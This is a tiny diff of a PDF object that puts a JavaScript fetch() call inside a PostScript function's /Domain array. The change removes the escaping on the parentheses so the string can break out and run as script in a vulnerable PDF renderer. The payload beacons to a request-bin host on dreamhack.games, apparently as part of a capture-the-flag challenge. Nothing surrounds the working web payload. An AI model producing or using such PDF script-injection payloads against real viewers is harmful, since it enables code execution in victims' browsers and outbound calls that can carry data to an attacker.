@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(fetch\('https://yomasft.request.dreamhack.games?hit=1'\).catch\(\(\)=>{}\)) 0]
+  /Domain [(fetch('https://yomasft.request.dreamhack.games?hit=1').catch(()=>{})) 0]
   /Range [0 0]
   /Length 12
 >>
